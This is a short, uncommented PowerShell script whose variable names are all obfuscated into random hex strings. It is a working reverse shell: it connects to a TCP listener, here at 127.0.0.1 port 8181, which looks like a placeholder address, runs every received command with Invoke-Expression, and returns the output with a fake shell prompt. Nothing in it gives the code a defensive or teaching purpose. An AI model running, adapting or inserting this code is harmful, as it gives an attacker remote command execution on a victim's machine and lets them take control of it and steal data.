$84b5d7ab8755451cb386a79589e39fa8 = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8181);
$3b95c1d3d7dc4e4fa6474ce1bceae743 = $84b5d7ab8755451cb386a79589e39fa8.GetStream(); 
[byte[]] $367ad63a4a834bf5bb275aab24a4890c = 0..65535|%{0};
while(($d084ee484cf44c09b003024847840f3d = $3b95c1d3d7dc4e4fa6474ce1bceae743.Read($367ad63a4a834bf5bb275aab24a4890c, 0, $367ad63a4a834bf5bb275aab24a4890c.Length)) -ne 0){; 
    $b16fd2353f0d413484e1583776256f61 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($367ad63a4a834bf5bb275aab24a4890c,0, $d084ee484cf44c09b003024847840f3d);
    $b396f8bb13ec47c28e4f721085e95361 = (iex $b16fd2353f0d413484e1583776256f61 2>&1 | Out-String ); 
    $2bfb84697b834fa09479071ec68d6b19 = $b396f8bb13ec47c28e4f721085e95361 + 'PS' + $(gl) + '> '; 
    $12e0e1f0c5e14474b53907ee11f75ed7 = ([text.encoding]::ASCII).GetBytes($2bfb84697b834fa09479071ec68d6b19);
    $3b95c1d3d7dc4e4fa6474ce1bceae743.Write($12e0e1f0c5e14474b53907ee11f75ed7,0, $12e0e1f0c5e14474b53907ee11f75ed7.Length);$3b95c1d3d7dc4e4fa6474ce1bceae743.Flush()
};
$84b5d7ab8755451cb386a79589e39fa8.Close()